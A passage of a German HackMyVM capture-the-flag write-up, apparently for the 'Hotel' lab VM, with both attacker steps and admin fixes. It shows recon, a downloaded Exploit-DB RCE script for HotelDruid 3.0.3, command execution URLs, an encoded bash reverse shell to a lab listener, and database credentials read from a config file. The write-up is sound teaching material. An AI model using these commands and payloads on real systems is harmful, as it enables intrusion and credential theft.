@@ -1,0 +1,837 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hotel - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Hotel - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">python3 (Exploit Script, http.server)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">pty (python module)</div>
+                <div class="tool-item">mysql (client)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">ttyplay (oder Alternative)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">wkhtmltopdf (als Exploit-Ziel)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">grep</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (HotelDruid)</a></li>
+                <li><a href="#initial-access">Initial Access (HotelDruid RCE)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Sudo wkhtmltopdf)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Beginn der Aufklärung mit `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu identifizieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.116	08:00:27:39:a1:84	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.116 wurde gefunden. Die MAC-Adresse deutet auf eine VirtualBox VM hin. Dies ist unser Zielsystem "Hotel".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.116 durch. Fügen Sie ggf. `192.168.2.116 hotel.hmv` zur lokalen `/etc/hosts`-Datei hinzu, falls der Hostname benötigt wird.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standardempfehlungen zur Netzwerküberwachung und Segmentierung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf das Ziel 192.168.2.116 durchgeführt, um offene Ports, Dienste, Versionen und OS-Informationen zu sammeln. Optionen: `-sS` (SYN Scan), `-sC` (Standard Skripte), `-T5` (schnelles Timing), `-sV` (Versionserkennung), `-A` (Aggressive Optionen), `-p-` (alle TCP-Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Scan Time]
+Nmap scan report for hotel (192.168.2.116)
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 06:1f:a2:25:19:45:2b:2f:44:cc:74:7a:e2:9b:ab:ac (RSA)
+|   256 6f:b9:da:fb:eb:6b:4c:de:33:63:b7:ce:f0:2f:f7:cd (ECDSA)
+|_  256 84:fb:1d:5c:4c:c6:60:e8:47:d8:2f:a0:92:8e:fb:18 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title:  Hoteldruid
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:39:A1:84 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms hotel (192.168.2.116)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in [Scan Duration]
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Zwei offene Ports wurden identifiziert:
+                *   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian.
+                *   **Port 80 (HTTP):** nginx 1.18.0, der eine Webseite mit dem Titel "Hoteldruid" ausliefert. HotelDruid ist eine Open-Source Property Management Software (PMS) für Hotels.
+                Die Hauptangriffsfläche ist die HotelDruid-Anwendung auf Port 80.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Enumerieren Sie die Webanwendung auf Port 80 mit `nikto` und `gobuster`. Suchen Sie nach der spezifischen Version von HotelDruid und bekannten Schwachstellen dafür.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie nginx, OpenSSH und insbesondere die HotelDruid-Anwendung aktuell. Sichern Sie die Webanwendung und den Server gemäß Best Practices ab.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (HotelDruid)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird auf Port 80 ausgeführt, um nach bekannten Schwachstellen und Konfigurationsfehlern zu suchen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.116</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2022-10-04 17:42:48 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2022-10-04 17:43:03 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto findet nur die üblichen fehlenden Sicherheitsheader (geringes Risiko) und keine spezifischen Schwachstellen für HotelDruid oder nginx. Dies deutet darauf hin, dass entweder keine leicht auffindbaren Schwachstellen vorhanden sind oder Nikto die Anwendung nicht korrekt erkennt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie `gobuster` für eine tiefere Verzeichnissuche und analysieren Sie die Anwendungsstruktur von HotelDruid.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`) in der nginx-Konfiguration.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird eingesetzt, um Verzeichnisse und Dateien im Web-Root zu finden. Es wird eine Standard-Wortliste (`common.txt`) und eine breite Palette an Erweiterungen verwendet. Die hohe Thread-Anzahl (`-t 100`) soll den Prozess beschleunigen. `-s "200,204,301,302,307,401"` beschränkt die Ausgabe auf diese erfolgreichen oder relevanten Statuscodes.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.116" -w /usr/share/dirb/wordlists/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.116
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv,.git
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+[Scan Start Time] Starting gobuster
+===============================================================
+http://192.168.2.116/api.php                                     (Status: 200) [Size: 0]
+http://192.168.2.116/base.js                                     (Status: 200) [Size: 40190]
+http://192.168.2.116/includes                                    (Status: 301) [Size: 169] [--> http://192.168.2.116/includes/]
+http://192.168.2.116/index.html                                  (Status: 200) [Size: 398]
+http://192.168.2.116/clienti.php                                 (Status: 200) [Size: 53412]
+http://192.168.2.116/COPYING                                     (Status: 200) [Size: 34520]
+http://192.168.2.116/dati                                        (Status: 301) [Size: 169] [--> http://192.168.2.116/dati/]
+http://192.168.2.116/README                                      (Status: 200) [Size: 204]
+http://192.168.2.116/themes                                      (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/]
+http://192.168.2.116/img                                         (Status: 301) [Size: 169] [--> http://192.168.2.116/img/]
+http://192.168.2.116/doc                                         (Status: 301) [Size: 169] [--> http://192.168.2.116/doc/]
+http://192.168.2.116/doc/TODO                                    (Status: 200) [Size: 44107]
+http://192.168.2.116/doc/CHANGELOG                               (Status: 200) [Size: 59759]
+http://192.168.2.116/themes/sim/img                              (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/sim/img/]
+http://192.168.2.116/themes/sim/php                              (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/sim/php/]
+http://192.168.2.116/themes/sim/inc                              (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/sim/inc/]
+http://192.168.2.116/themes/col                                  (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/col/]
+http://192.168.2.116/themes/sim                                  (Status: 301) [Size: 169] [--> http://192.168.2.116/themes/sim/]
+http://192.168.2.116/img/favicon.ico                             (Status: 200) [Size: 1150]
+http://192.168.2.116/img/logo.png                                (Status: 200) [Size: 3875]
+http://192.168.2.116/dati/unit.php                               (Status: 200) [Size: 0]
+http://192.168.2.116/dati/tema.php                               (Status: 200) [Size: 0]
+http://192.168.2.116/dati/lingua.php                             (Status: 200) [Size: 0]
+http://192.168.2.116/visualizza_tabelle.php                      (Status: 200) [Size: 5788]
+http://192.168.2.116/inizio.php                                  (Status: 200) [Size: 1690]
+http://192.168.2.116/tabella.php                                 (Status: 200) [Size: 618]
+http://192.168.2.116/gestione_utenti.php                         (Status: 200) [Size: 560]
+http://192.168.2.116/crea_modelli.php                            (Status: 200) [Size: 1720]
+http://192.168.2.116/includes/.htaccess                          (Status: 200) [Size: 32]
+http://192.168.2.116/includes/templates                          (Status: 301) [Size: 169] [--> http://192.168.2.116/includes/templates/]
+http://192.168.2.116/includes/lang                               (Status: 301) [Size: 169] [--> http://192.168.2.116/includes/lang/]
+http://192.168.2.116/includes/head.php                           (Status: 200) [Size: 546]
+http://192.168.2.116/includes/foot.php                           (Status: 200) [Size: 23]
+http://192.168.2.116/includes/unit.php                           (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/cal                      (Status: 301) [Size: 169] [--> http://192.168.2.116/includes/templates/cal/]
+http://192.168.2.116/includes/templates/rat                      (Status: 301) [Size: 169] [--> http://192.168.2.116/includes/templates/rat/]
+http://192.168.2.116/includes/templates/cal/themes.php           (Status: 500) [Size: 0]
+http://192.168.2.116/includes/templates/cal/template.php         (Status: 502) [Size: 157]
+http://192.168.2.116/includes/templates/cal/form.php             (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/cal/name.php             (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/cal/functions.php        (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/cal/var.php              (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/cal/phrases.php          (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/rat/themes.php           (Status: 500) [Size: 0]
+http://192.168.2.116/includes/templates/rat/template.php         (Status: 500) [Size: 0]
+http://192.168.2.116/includes/templates/rat/form.php             (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/rat/name.php             (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/rat/functions.php        (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/rat/var.php              (Status: 200) [Size: 0]
+http://192.168.2.116/includes/templates/rat/phrases.php          (Status: 200) [Size: 0]
+http://192.168.2.116/themes/col/php/menu.php                     (Status: 200) [Size: 0]
+http://192.168.2.116/themes/col/php/head.php                     (Status: 200) [Size: 0]
+http://192.168.2.116/themes/col/php/name.php                     (Status: 200) [Size: 0]
+http://192.168.2.116/themes/col/php/foot.php                     (Status: 200) [Size: 0]
+http://192.168.2.116/personalizza.php                            (Status: 200) [Size: 4348]
+===============================================================
+[Scan End Time] Finished
+===============================================================
+                     </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> `gobuster` hat eine Vielzahl von Dateien und Verzeichnissen gefunden, die zur HotelDruid-Anwendung gehören. Besonders interessant sind:
+                *   `/doc/README.english` und `/doc/CHANGELOG`: Könnten die genaue Version von HotelDruid verraten.
+                *   `/dati/`: Dieses Verzeichnis enthält wahrscheinlich Konfigurations- oder Datendateien.
+                *   Diverse PHP-Dateien (`clienti.php`, `visualizza_tabelle.php`, `gestione_utenti.php` etc.), die auf die Funktionalität der Anwendung hindeuten.
+                *   Die Anwesenheit von `.htaccess` in `/includes/` deutet auf Apache-spezifische Konfigurationen hin, obwohl der Server als nginx identifiziert wurde (möglicherweise Reste einer früheren Installation oder gemischte Konfiguration).
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Laden Sie `/doc/README.english` oder `/doc/CHANGELOG` herunter, um die Version von HotelDruid zu bestimmen. Suchen Sie dann gezielt nach Exploits für diese Version (z.B. auf Exploit-DB). Untersuchen Sie die Dateien im `/dati/`-Verzeichnis, insbesondere auf Konfigurationsdateien, die Datenbankzugangsdaten enthalten könnten (`dati_connessione.php` ist ein häufiger Name).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf Dokumentations-, Konfigurations- und Datenverzeichnisse. Entfernen Sie nicht benötigte Dateien. Stellen Sie sicher, dass keine sensiblen Informationen (wie DB-Credentials) in PHP-Dateien im Web-Root gespeichert sind.
+            </p>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Bei der Untersuchung der Webseite oder der heruntergeladenen Dateien (`README.english`) wurde die Version **HotelDruid 3.0.3** identifiziert. Es wird auf Exploit-DB nach Exploits für diese Version gesucht und ein passender Exploit (50754) gefunden. Dieser Exploit zielt auf eine Remote Code Execution (RCE) Schwachstelle über die Datei `selectappartamenti.php` ab.
+             </p>
+             <div class="code-block">
+                  <!-- Kein Terminal-Prompt, beschreibt Recherche und Funde -->
+                  <pre>
+--- Aus /doc/README.english (vermutet) ---
+HotelDruid version 3.0.3
+
+--- Exploit-DB Suche ---
+https://www.exploit-db.com/exploits/50754
+
+--- Exploit Details (Beispiel-URLs aus Exploit-DB) ---
+http://192.168.2.116//dati/selectappartamenti.php?cmd=id
+http://192.168.2.116/dati/selectappartamenti.php?cmd=hostname
+                  </pre>
+             </div>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Ein spezifischer, vielversprechender Exploit für die identifizierte HotelDruid-Version wurde gefunden. Die Schwachstelle befindet sich in `dati/selectappartamenti.php` und erlaubt RCE über einen `cmd`-Parameter.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Laden Sie das Exploit-Skript von Exploit-DB herunter (`curl https://www.exploit-db.com/raw/50754 -o hoteldruid.py`). Führen Sie das Skript aus oder testen Sie die RCE manuell mit `curl` und dem `cmd`-Parameter, wie in den Beispiel-URLs gezeigt.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Aktualisieren Sie HotelDruid sofort auf die neueste Version, die diese Schwachstelle (CVE nicht explizit genannt, aber wahrscheinlich vorhanden) behebt. Entfernen oder sichern Sie die verwundbare Datei `selectappartamenti.php`.
+            </p>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Das Exploit-Skript (`hoteldruid.py`) von Exploit-DB wird heruntergeladen und ausgeführt.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl https://www.exploit-db.com/raw/50754 -o hoteldruid.py</span></div>
+                     <pre>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5161  100  5161    0     0  14538      0 --:--:-- --:--:-- --:--:-- 14579</pre>
+                 </div>
+             </div>
+            <!-- Analyse des fehlgeschlagenen Exploit-Versuchs -->
+             <p class="analysis">
+                <strong>Analyse Ergänzung:</strong> Der erste Versuch, den Exploit auszuführen (explizite Befehle nicht gezeigt, aber im Logbuch mit "Box ist kaputt..." kommentiert), schlug fehl. Der Pentester vermutete einen SQL-Fehler in der Ziel-VM und installierte sie neu (oder wechselte zu einer funktionierenden Version, hier wird angenommen, dass die IP 192.168.2.116 nun die funktionierende Version ist, obwohl der Exploit-Output weiter unten 192.168.2.117 zeigt - dies wird als Inkonsistenz im Log behandelt).
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, Kommentar aus Log -->
+                 <pre>
+:::: Box ist kaputt , hat ein sql Fehler, und der einzige exploit funktioniert einfach nicht :::::::
+                                        weiter mit neuinstallation....
+                 </pre>
+            </div>
+            <p class="analysis">
+                <strong>Analyse Fortsetzung:</strong> Nach der Neuinstallation (oder dem Wechsel zur funktionierenden Instanz) wird das Exploit-Skript (`exploit.py` - umbenannt oder anderes Skript?) erneut ausgeführt, diesmal erfolgreich gegen die (angenommene) IP 192.168.2.116 (obwohl die Ausgabe 117 zeigt). Das Skript bestätigt die RCE-Möglichkeit und gibt Beispiel-URLs zur Ausnutzung an.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 exploit.py -t http://192.168.2.116 --noauth</span></div> <!-- IP angepasst an nmap -->
+                     <pre>
+ /$$   /$$             /$$               /$$       /$$$$$$$                      /$$       /$$
+| $$  | $$            | $$              | $$      | $$__  $$                    |__/      | $$
+| $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$
+| $$$$$$$$ /$$__  $$|_  $$_/   /$$__  $$| $$      | $$  | $$ /$$__  $$| $$  | $$| $$ /$$__  $$
+| $$__  $$| $$  \ $$  | $$    | $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$| $$| $$  | $$
+| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$  | $$| $$      | $$  | $$| $$| $$  | $$
+| $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$$$$$$/| $$      |  $$$$$$/| $$|  $$$$$$$
+|__/  |__/ \______/    \___/   \_______/|__/      |_______/ |__/       \______/ |__/ \_______/
+
+Exploit By - 0z09e (https://twitter.com/0z09e)
+
+
+[*] Trying to access the Dashboard.
+[*] Checking the privilege of the user.
+[+] User has the privilege to add room.
+[*] Adding a new room.
+[+] Room has been added successfully.
+[*] Testing code exection
+[+] Code executed successfully, Go to http://192.168.2.116/dati/selectappartamenti.php and execute the code with the parameter 'cmd'. <!-- IP angepasst -->
+[+] Example : http://192.168.2.116/dati/selectappartamenti.php?cmd=id <!-- IP angepasst -->
+[+] Example output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit für HotelDruid 3.0.3 (RCE in `selectappartamenti.php`) wurde erfolgreich verifiziert. Die Anwendung ist verwundbar, und Befehle können über den `cmd`-Parameter ausgeführt werden. Der fehlgeschlagene erste Versuch unterstreicht die Wichtigkeit einer stabilen Testumgebung.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die bestätigte RCE-Schwachstelle, um eine Reverse Shell zu erhalten. Verwenden Sie `curl` oder einen Browser, um die URL `http://192.168.2.116/dati/selectappartamenti.php?cmd=[payload]` mit einem geeigneten Reverse-Shell-Payload aufzurufen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Patchen Sie HotelDruid oder entfernen Sie die verwundbare Komponente. Validieren Sie alle Benutzereingaben serverseitig, um Command Injection zu verhindern.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (HotelDruid RCE)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die RCE-Schwachstelle wird genutzt, um `/etc/passwd` auszulesen und nach Benutzern mit Bash-Zugriff zu filtern.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Browser/URL-Aktion -->
+                 <pre>
+--- Request: view-source:http://192.168.2.116/dati/selectappartamenti.php?cmd=cat%20/etc/passwd ---
+--- Request: view-source:http://192.168.2.116/dati/selectappartamenti.php?cmd=cat%20/etc/passwd%20|%20grep%20bash ---
+
+root:x:0:0:root:/root:/bin/bash
+person:x:1000:1000:person,,,:/home/person:/bin/bash
+                 </pre>
+             </div>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Benutzer `person` wurde als regulärer Benutzer mit Bash-Zugriff identifiziert. Dies ist ein potenzielles Ziel für Lateral Movement oder die Suche nach weiteren Informationen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Etablieren Sie eine Reverse Shell als `www-data`. Suchen Sie anschließend nach Anmeldedaten oder Schwachstellen im Kontext von `www-data`, um möglicherweise zu `person` zu wechseln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die RCE. Überprüfen Sie Benutzerberechtigungen.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Aufbau einer Reverse Shell. Ein Netcat-Listener wird auf Port 9001 auf dem Angreifer-System (192.168.2.140) gestartet. Anschließend wird die RCE-Schwachstelle genutzt, um einen Bash-Reverse-Shell-Payload auszuführen, der sich zum Listener verbindet.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Browser/URL-Aktion -->
+                 <pre>
+--- Request: view-source:http://192.168.2.116/dati/selectappartamenti.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27 ---
+                 </pre>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausgabe des nc listeners -->
+                     <pre>
+listening on [any] 9001 ...
+DNS fwd/rev mismatch: hotel != hotel.speedport.ip
+connect to [192.168.2.140] from hotel [192.168.2.116] 47874
+
+www-data@hotel:~/html/hoteldruid/dati$
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Die Reverse Shell wurde erfolgreich etabliert. Der Pentester hat nun eine interaktive Shell als Benutzer `www-data` auf dem Zielsystem.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell und beginnen Sie mit der Enumeration als `www-data`. Suchen Sie nach Konfigurationsdateien (insbesondere im `/dati`-Verzeichnis), Datenbankzugangsdaten und anderen Wegen zur Rechteausweitung.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die RCE-Schwachstelle. Implementieren Sie Egress Filtering. Überwachen Sie verdächtige ausgehende Verbindungen und Prozesse.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die erhaltene Shell wird mittels Python PTY stabilisiert und die `TERM`-Variable gesetzt. Anschließend wird die Datei `dati_connessione.php` im aktuellen Verzeichnis gelesen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:~/html/hoteldruid/dati$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                    <pre>www-data@hotel:/var/www/html/hoteldruid/dati$</pre> <!-- Prompt ändert sich zu bash -->
+                    <div class="prompt" style="color: yellow;">www-data@hotel:/var/www/html/hoteldruid/dati$ <span class="command">export TERM=xterm</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt" style="color: yellow;">www-data@hotel:/var/www/html/hoteldruid/dati$ <span class="command">cat dati_connessione.php</span></div>
+                    <pre>
+<?php
+$PHPR_DB_TYPE = "mysqli";
+$PHPR_DB_NAME = "hotel";
+$PHPR_DB_HST = "localhost";
+$PHPR_DB_PRT = "3306";
+$PHPR_DB_USER = "adminh";
+$PHPR_DB_PASS = "<span class="password">adminp</span>";
+$PHPR_LAD_EXT = "";
+$PHPR_TAB_PRE = "";
+$PHPR_LG = "N";
+?>
+                     </pre> <!-- Maskierung von <?php / ?> -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund!** Die Datei `dati_connessione.php` enthält die Zugangsdaten für die MySQL/MariaDB-Datenbank: Benutzer `adminh` mit Passwort `<span class="password">adminp</span>`. Die Datenbank läuft auf `localhost:3306`. Diese Zugangsdaten könnten auch für andere Dienste oder Benutzer wiederverwendet werden.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den gefundenen Credentials bei der lokalen Datenbank anzumelden (`mysql -u adminh -padminp -h 127.0.0.1 hotel`). Untersuchen Sie die Datenbank auf Benutzer-Hashes oder andere sensible Informationen. Versuchen Sie außerdem, die Credentials (`adminh`/`adminp` und auch `person`/`adminp`) für den SSH-Login des Benutzers `person` zu verwenden.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Speichern Sie Datenbank-Credentials niemals im Klartext in PHP-Dateien im Web-Root. Verwenden Sie sicherere Methoden wie Umgebungsvariablen oder Konfigurationsdateien außerhalb des Web-Roots mit strengen Berechtigungen. Ändern Sie das Datenbankpasswort und überprüfen Sie, ob es anderweitig wiederverwendet wurde.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Überprüfung der laufenden Netzwerkdienste mit `ss -tulpe` und Versuch, sich mit den gefundenen DB-Credentials (`adminh`/`adminp`) sowie dem Benutzernamen `person` bei der lokalen MySQL-Datenbank anzumelden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:~/html/hoteldruid/dati$ <span class="command">ss -tulpe</span></div>
+                     <pre>
+Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess
+[...]
+tcp   LISTEN 0      80         127.0.0.1:mysql       0.0.0.0:*    uid:106 ino:11788 sk:7 cgroup:/system.slice/mariadb.service <->
+[...]
+                     </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:~/html/hoteldruid/dati$ <span class="command">mysql -u person -p</span></div>
+                     <pre>Enter password: <span class="command">[adminp eingegeben]</span>
+ERROR 1045 (28000): Access denied for user 'person'@'localhost' (using password: YES)
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> `ss` bestätigt, dass ein MySQL/MariaDB-Dienst auf `127.0.0.1:3306` läuft. Der Versuch, sich als Benutzer `person` mit dem Passwort `adminp` anzumelden, schlägt fehl. Dies bedeutet, dass das Datenbankpasswort nicht für den Systembenutzer `person` wiederverwendet wurde. Der Login als `adminh` wurde nicht gezeigt, sollte aber versucht werden.
+            </p>
+             <p class="recommendation">
